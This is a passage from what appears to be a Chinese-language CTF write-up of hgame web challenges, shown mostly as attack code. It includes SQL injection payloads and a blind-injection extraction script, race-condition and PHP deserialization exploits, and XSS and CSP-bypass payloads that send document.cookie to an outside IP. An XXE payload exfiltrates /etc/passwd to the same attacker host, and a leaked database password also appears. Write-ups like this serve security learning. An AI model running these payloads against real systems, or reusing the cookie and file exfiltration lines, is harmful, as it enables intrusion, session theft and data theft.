?&gt;&#39;&gt;</code></pre><p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p><p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p><h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p><p>过滤:select</p><p>黑名单:空格</p><pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#information_schema,easysql0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#f1aggggggggggggg,messages#GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;fl4444444ghgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p><pre><code class="php">&lt;?php// function encrypt($str){//     $result = &#39;&#39;;//     for($i = 0; $i &lt; strlen($str); $i++){//         $result .= chr(ord($str[$i]) + 1);//     }//     return $result;// }function encrypt($str){    $result = &#39;&#39;;    for($i = 0; $i &lt; strlen($str); $i++){        $result .= chr(ord($str[$i]) - 1);    }    return $result;}$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;){    $arr=array();    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);    $newcmd=$arr[0].$newcmd.&quot;)&quot;;        $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);}$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    $dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);?&gt;</code></pre><p>python </p><pre><code class="python">import requestsdef get_flag():    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]    enccmd=enccmd[:len(enccmd)-75]    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text    data={&quot;token&quot;:dec}    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])get_flag()</code></pre><h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre><p>输入会变成大写</p><h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p><p>而默认的逻辑是没法实现的</p><pre><code class="php">        if($this-&gt;rank &lt;= 2){                $this-&gt;rank = 2;            }</code></pre><p>阅读代码发现反序列化点:</p><p><code>Monster</code>的<code>__construct</code>方法</p><pre><code class="php">public function __construct($key){        $this-&gt;encryptKey = $key;        if(!isset($_COOKIE[&#39;monster&#39;])){            $this-&gt;Set();            return;        }        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);        if(strlen($monsterData) &gt; 32){            $sign = substr($monsterData, -32);            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);            if(md5($monsterData . $this-&gt;encryptKey) === $sign){                $this-&gt;monsterData = unserialize($monsterData);            }else{                session_start();                session_destroy();                setcookie(&#39;monster&#39;, &#39;&#39;);                header(&#39;Location: index.php&#39;);                exit;            }        }        $this-&gt;Set();         }</code></pre><p>但是要知道<code>$key</code>才能反序列化</p><p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p><pre><code class="php">class Game{       private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    private $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign        $this-&gt;monster = new Monster($this-&gt;sign);        $this-&gt;rank = new Rank();    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}</code></pre><p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p><pre><code class="php">public function __destruct(){        // 确保程序是跑在服务器上的！        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];        if($this-&gt;key === $this-&gt;serverKey){            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;        }else{            // 非正常访问            session_start();            session_destroy();            setcookie(&#39;monster&#39;, &#39;&#39;);            header(&#39;Location: index.php&#39;);            exit;        }    }</code></pre><p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p><p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p><p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p><p>如:</p><pre><code class="php">&lt;?phpclass test{    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;    public function __destruct()    {        echo $this-&gt;my_static;    }}class tesa{}$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));unserialize($a);结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre><p>于是构造</p><pre><code class="php">&lt;?phpclass Game{    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    public $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}class Rank{    private $rank;//    private $serverKey;     // 服务器的 Key//    private $key;    public function __construct()    {        $this-&gt;rank=1;    }    public function __destruct(){    }}$s=new Rank();//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);$a=new Game($_GET[&#39;name&#39;]);$sign = md5(serialize($s) . $a-&gt;sign);print( base64_encode(serialize($s) . $sign));?&gt;</code></pre><h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p><p>前一段时间爆出来的mt_srand逆向刚好可以用到</p><p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p><pre><code class="php">import requestsimport osburp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).texta=eval(result)p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )x=p.read().strip()burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}burp0_data = {&quot;ans&quot;: x}print(burp0_data)result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).textprint(result)</code></pre><h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p><p>admin,123456</p><h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p><p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p><p>我来模拟以下造成条件竞争漏洞的原因</p><p>首先猜测以下solve和buy方法的流程</p><pre><code class="php">function solve(){    #1. $num=从数据库中查找要用户持有的卖出商品的个数    #2. 如果数量足够,则进行下一步,否则返回并报错    #3. 在数据库中增加用户账户里的钱    #4. 在数据库中减少用户拥有该商品的数量}</code></pre><p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p><ol><li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li><li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li><li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li><li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li><li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li><li>b进程结束</li></ol><p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p><p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p><p>刷钱脚本</p><pre><code class="python">from multiprocessing import Poolimport requestsdef buy(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully buy %d items&quot; % num)def solve(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully solve %d items&quot; % num)if __name__==&#39;__main__&#39;:    i=0    while True:        p = Pool(100)        num=500        for i in range(100):            p.apply_async(buy, args=(num,))        print(&#39;Waiting for all buy subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)        p = Pool(100)        for i in range(100):            p.apply_async(solve, args=(num,))        print(&#39;Waiting for all solve subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)</code></pre><h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p><pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre><p>一个个检测输入点发现,delete方法存在sql注入</p><p>注入脚本</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupdef send():    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)    if res.status_code==200:        return 1    else :        return 0def get_id():    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    html = res.text    try :        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]    except:        return False    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)def check(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)    if url in res.text:        return True    return False#index.php?method=delete&amp;delete_id=6594def delete(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)def sql_inj(sql):    mesid=get_id()    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)    if not check(mesid):        print(&quot;%s success&quot; % sql)        send()        return True    print(&quot;%s fail&quot; % sql)    return False# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)cha=&quot;0123456789ABCDEF&quot;result=&quot;&quot;p=0while True:    p+=1    temp=&#39;&#39;    for i in cha:        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):            result+=i            temp=i            print(result)            break    if temp!=result[-1]:        break#information_schema,babysql#messages,user#id,name,password</code></pre><h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p><p>存在csp:</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p><p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p><p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p><p>说object-src不安全</p><p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p><p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p><p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p><p>我们发送以下payload(用script标签也一样)</p><pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p><p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p><p>最后的payload</p><pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3biframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3beval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p><h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;File stored on http://39.108.164.219/evil.xml&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);    $stmt-&gt;bindParam(&#39;:id&#39;, $id);    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $id = $creds-&gt;id;    $chal_name = $creds-&gt;name;    $level = $creds-&gt;level;    $time = $creds-&gt;time;    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);        die($result);    }    $stmt-&gt;execute();    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);}catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$dbms=&#39;mysql&#39;;$host=&#39;localhost&#39;;$dbName=&#39;bdctr_message&#39;;$user=&#39;root&#39;;$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);?&gt;</code></pre><p>原本想着用gopher执行sql语句,但是有密码无法执行</p><p>我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下</p><pre><code>IP address       HW type     Flags       HW address            Mask     Device172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0</code></pre><pre><code>127.0.0.1    localhost::1    localhost ip6-localhost ip6-loopbackfe00::0    ip6-localnetff00::0    ip6-mcastprefixff02::1    ip6-allnodesff02::2    ip6-allrouters172.21.0.76    hgame-private172.21.0.31    f9f1b9b99e13</code></pre><p>发现一个内网服务器<code>172.21.0.76</code></p><p>当尝试访问80端口时,发现文件太大等一系列问题</p><blockquote><p>使用libxml读取文件时,文件不能太大否则会报错</p></blockquote><p>于是尝试压缩能不能读取</p><pre><code>&lt;?php    error_reporting(0);    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);    